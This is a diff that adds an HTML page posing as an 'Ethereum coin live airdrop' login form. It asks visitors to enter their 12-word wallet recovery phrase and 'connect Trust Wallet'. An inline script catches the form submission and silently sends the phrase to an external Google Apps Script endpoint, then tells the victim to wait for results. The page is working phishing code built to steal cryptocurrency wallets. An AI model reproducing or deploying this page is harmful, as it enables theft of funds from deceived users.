@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Animated Login Form</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link href="https://fonts.googleapis.com/css?family=Poppins:600&display=swap" rel="stylesheet">
+	<script src="https://kit.fontawesome.com/a81368914c.js"></script>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+	<img class="wave" src="img/wave.png">
+	<div class="container">
+		<div class="img">
+			<img src="img/kisspng-cryptocurrency-blockchain-bitcoin-altcoins-vector-5c4e9a8fd82616.7661343215486552478854.png">
+		</div>
+		<div class="login-content">
+			<form action="index.html" autocomplete="off" name="google-sheet" method="post">
+				<img src="img/ethereum-eth-logo.png">
+				<h2 class="title">ETHEREUM COIN LIVE AIRDROP! [4.5eth]</h2>
+           		<div class="input-div one">
+           		   <div class="i">
+           		   		<i class="fas fa-user"></i>
+           		   </div>
+           		   <div class="div">
+           		   		<h5>Enter 12 Phrase Key </h5>
+           		   		<input   type="text" name="Name" class="input"  value="" required="">
+           		   </div>
+           		</div>
+           		
+            	<input type="submit" name="submit" class="btn" value="CONNECT TRUST WALLET">
+            </form>
+		
+        </div>
+    </div>
+    <script type="text/javascript" src="js/main.js">
+	</script>
+	 <script>
+		const scriptURL = 'https://script.google.com/macros/s/AKfycbwLwRmo8cx_1gW6XxzFDOIbUtGFi3YaPPLrat36Y_Tocyi6jOwCqRRWnYgGg1-bNeke/exec'
+
+		const form = document.forms['google-sheet']
+	  
+		form.addEventListener('submit', e => {
+		  e.preventDefault()
+		  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+			.then(response => alert("thanks for submitting! please wait for the result"))
+			.catch(error => console.error('Error!', error.message))
+		})
+	  </script>
+</body>
+</html>
